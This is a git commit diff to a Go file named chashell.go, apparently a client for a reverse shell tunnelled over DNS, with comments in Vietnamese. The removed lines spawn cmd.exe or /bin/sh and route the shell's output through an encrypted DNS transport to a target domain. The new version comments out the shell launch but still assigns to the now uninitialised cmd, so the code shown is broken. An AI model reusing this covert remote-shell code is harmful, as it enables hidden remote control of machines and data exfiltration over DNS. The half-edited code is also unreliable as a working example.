b3a762537ae73d83186d73f6752be5d5d4d64b01
Hồ Duy Quốc Bảo <hoduyquocbao@gmail.com>
2021-09-17 12:12:33 +0700

    up

--- cmd/client/chashell.go
+++ cmd/client/chashell.go
@@ -4,9 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"ipwf/lib/transport"
-	"os"
 	"os/exec"
-	"runtime"
 )
 
 // khởi tạo 2 mảng chứa tên miền và encryptionKey
@@ -20,29 +18,15 @@ func main() {
 	var cmd *exec.Cmd
 
 	// // kiểm tra nếu bằng window thì sử dụng cmd.exe
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd.exe")
-	} else {
-		// nếu khác window thì sử dụng mặc định của unix
-		cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
-	}
+	// if runtime.GOOS == "windows" {
+	// 	cmd = exec.Command("cmd.exe")
+	// } else {
+	// 	// nếu khác window thì sử dụng mặc định của unix
+	// 	cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
+	// }
 
 	// khởi tạo dnsTransport bằng dữ liệu đã gói của DNSStream
 	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)
-
-	// os.Stdout = dnsTransport
-	// fmt.Printf("%s\n", dnsTransport)
-	scanner := bufio.NewScanner(dnsTransport)
-	// scanner.Text() = dnsTransport
-	for scanner.Scan() {
-		fmt.Println(scanner.Text())
-	}
-
-	// if scanner.Err() != nil {
-	// 	// Handle error.
-	// 	fmt.Println(scanner.Err())
-
-	// }
 
 	// // gán cho cmd.Stdout bằng dữ liệu của dnsTransport
 	cmd.Stdout = dnsTransport
@@ -52,15 +36,26 @@ func main() {
 
 	// // gán cho cmd.Stdin bằng dữ liệu của dnsTransport
 	// cmd.Stdin = dnsTransport
-	cmd.Stdin = bufio.NewReader(os.Stdin)
+
+	scanner := bufio.NewScanner(dnsTransport)
+	// scanner.Text() = dnsTransport
+	for scanner.Scan() {
+		fmt.Println(scanner.Text())
+	}
+
+	if scanner.Err() != nil {
+		// Handle error.
+		fmt.Println(scanner.Err())
+
+	}
 
 	// // hiển thị dnsTransport để kiểm xoát thêm
 
 	// //	khởi tạo err bằng cách chạy cmd.Run()
-	err := cmd.Run()
+	// err := cmd.Run()
 
 	// // nếu có lỗi sẽ trả về
-	if err != nil {
-		return
-	}
+	// if err != nil {
+	// 	return
+	// }
 }
